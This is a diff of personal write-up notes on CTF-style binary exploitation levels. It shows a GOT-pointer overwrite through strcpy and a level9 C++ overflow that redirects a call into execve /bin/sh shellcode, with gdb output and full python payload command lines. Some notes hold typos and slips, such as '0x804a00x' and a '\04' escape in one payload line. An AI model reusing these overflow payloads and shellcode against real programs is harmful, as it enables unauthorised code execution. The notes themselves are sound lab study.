@@ -303,7 +303,7 @@ paste this address 0x37614136 : offset is 20 ! (cause its this one which will be
 let's get the puts GOT address in gdb. (the pointer to overwrite)
 0x08048400
 \x00\x84\x04\x08 NOPE NO THIS ONE
-Cause we need not the overwrite the entire address of puts, but the pointer !
+Cause we need not to overwrite the entire address of puts, but the pointer address only !
 
 so gdb ./level7 - info functions puts then get the adress and disassemble it
 disass 0x08048400
@@ -316,8 +316,8 @@ so the first one is the pointer !
 0x8049928
  little endian :\x28\x99\x04\x08
 
-test with ltrace to overwrite the second strcpy :
-python -c 'print "B" * 20 + "\x00\x84\x04\x08"'
+///test with ltrace to overwrite the second strcpy :
+python -c 'print "B" * 20 + "\x00\x84\x04\x08"'///
 
 ./level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
 
@@ -360,22 +360,51 @@ we can see in the binary that there is a class N, containing multiples functions
 it is in cpp, so theres no /bin/sh calls, we have to use a shellcode.
 
 the only intersting function is probably the setAnnotation(char*) that gets called at the end of main.
-it uses memcpy, and because it takes the arg of argv[1], we should be able to modifiy eax to call a shellcode.
+it uses memcpy, and because it takes the arg of argv[1] for strlen, so we should use that memcpy to calls edx which will call our shellcode.
 
 lets find the offset of eax :
 
 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
 pattern generator
 
-we found the offset of eax at 200 length : 108 !
-(100 was not sufficient for a sigsegv)
+we found the offset of eax : 108 !
+
+so the final payload must be 108 bytes.
+
+so now we must find the start address of our buffer and replace the value of 'esp+0x10' by it to make the call to edx that calls our shellcode.
+but we need to dereference twice like we want to access to the N class, our return address should points to an address which points to the start buffer
+
+
+(gdb) b *main+136
+Breakpoint 1 at 0x804867c
+(gdb) run 'AAAA'
+Starting program: /home/user/level9/level9 'AAAA'
+
+Breakpoint 1, 0x0804867c in main ()
+(gdb) x $eax
+0x804a00c:	0x41414141
 
 
 
+the value of 'esp+0x10' will be replaced with 0x804a00c. We need to dereference again, this address will points the begining of our shellcode : 0x804a00x + 4 = 0x804a010
+
+
+	  \x10\xa0\x04\x08		     \x0c\xa0\x04\x08
+payload : shell_addr + shellcode + padding + buffer_addr  
+	  4b           28b         76b        4b         = 108 + 4
+	  
+	 
+shellcode :
+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
+23b
 
 
 
+python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A" * 76 + "\x0c\xa0\04\x08"'
 
+
+
+./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "A" * 76 + "\x0c\xa0\x04\x08"')
 
 
 
